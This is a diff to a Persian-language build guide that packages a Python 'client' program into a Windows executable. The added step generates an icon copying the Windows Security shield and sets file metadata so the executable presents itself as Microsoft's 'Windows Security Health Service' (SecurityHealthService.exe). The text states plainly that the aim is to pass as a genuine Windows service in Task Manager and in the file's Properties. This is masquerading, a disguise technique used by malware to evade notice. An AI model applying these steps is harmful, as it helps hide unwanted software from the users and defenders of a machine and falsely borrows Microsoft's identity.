@@ -213,7 +213,25 @@ logging:
 pip install pyinstaller
 ```
 
-### مرحله ۳ — ساخت فایل اجرایی
+### مرحله ۳ — ساخت آیکون سیستمی (یک بار)
+
+قبل از build، اسکریپت زیر را اجرا کن تا یک آیکون شبیه سرویس‌های ویندوز (شیلد آبی Windows Security) تولید شود:
+
+```bash
+python client/assets/generate_icon.py
+# خروجی: client/assets/icon.ico
+```
+
+این آیکون در Task Manager و Properties فایل exe نمایش داده می‌شود و شبیه سرویس‌های واقعی ویندوز به نظر می‌رسد. علاوه بر آیکون، فایل `version_info.txt` هم تنظیم شده که در Properties فایل exe اطلاعات زیر را نشان می‌دهد:
+
+| فیلد | مقدار |
+|------|-------|
+| File Description | Windows Security Health Service |
+| Company Name | Microsoft Corporation |
+| Original Filename | SecurityHealthService.exe |
+| Product Name | Microsoft® Windows® Operating System |
+
+### مرحله ۴ — ساخت فایل اجرایی
 
 از **ریشه پروژه** اجرا کن:
 
